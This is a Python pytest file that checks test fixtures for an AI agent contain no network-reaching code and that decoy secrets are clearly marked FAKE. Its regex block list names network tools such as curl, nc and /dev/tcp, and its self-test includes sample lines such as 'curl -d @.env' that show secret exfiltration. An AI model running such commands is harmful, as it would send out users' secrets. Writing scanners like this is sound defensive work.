"""Guard rails for what a fixture may contain. A fixture is data an agent will read and may act on:
none of it may reach the network, whatever its impact level (see "Ceiling" in the README)."""

import re
from pathlib import Path

import pytest

FIXTURES = Path(__file__).parent.parent / "fixtures"

NETWORK_COMMANDS = re.compile(
    r"\b(curl|wget|nc|ncat|netcat|ssh|scp|sftp|ftp|telnet|rsync|nslookup|ping)\b|/dev/(tcp|udp)/"
)
NETWORK_IMPORTS = re.compile(
    r"^\s*(import|from)\s+(socket|ssl|urllib|http|httpx|requests|aiohttp|ftplib|smtplib|telnetlib|"
    r"xmlrpc|websockets|paramiko)\b",
    re.MULTILINE,
)
URL = re.compile(r"https?://|\b(localhost|127\.0\.0\.1)\b", re.IGNORECASE)


def network_findings(text: str) -> list[str]:
    """What in this text would reach, or point at, the network."""
    found = [m.group(0).strip() for m in NETWORK_COMMANDS.finditer(text)]
    found += [m.group(0).strip() for m in NETWORK_IMPORTS.finditer(text)]
    found += [m.group(0) for m in URL.finditer(text)]
    return found


def fixture_files() -> list[Path]:
    return sorted(p for p in FIXTURES.rglob("*") if p.is_file() and p.name != "case.yaml")


@pytest.mark.parametrize("path", fixture_files(), ids=lambda p: str(p.relative_to(FIXTURES)))
def test_fixture_file_has_no_network_code(path: Path) -> None:
    assert network_findings(path.read_text()) == [], path


def test_the_scanner_catches_what_it_is_meant_to() -> None:
    assert network_findings("curl -d @.env example") == ["curl"]
    assert network_findings("import socket\nsocket.create_connection(('h', 1))") == ["import socket"]
    assert network_findings("from urllib.request import urlopen") == ["from urllib"]
    assert network_findings("see https://example.com") == ["https://"]
    assert network_findings("POST to localhost:8080") == ["localhost"]
    assert network_findings("cat /dev/tcp/10.0.0.1/80") == ["/dev/tcp/"]
    assert network_findings("Keep commit messages short; mapping and shipping are fine.") == []


def test_decoy_secrets_are_obviously_fake() -> None:
    # A decoy a reader could mistake for a real credential is not allowed.
    for path in fixture_files():
        for line in path.read_text().splitlines():
            if re.search(r"(key|secret|token|password)\s*[:=]", line, re.IGNORECASE) and "{{TOKEN}}" not in line:
                assert "FAKE" in line.upper(), (path, line)
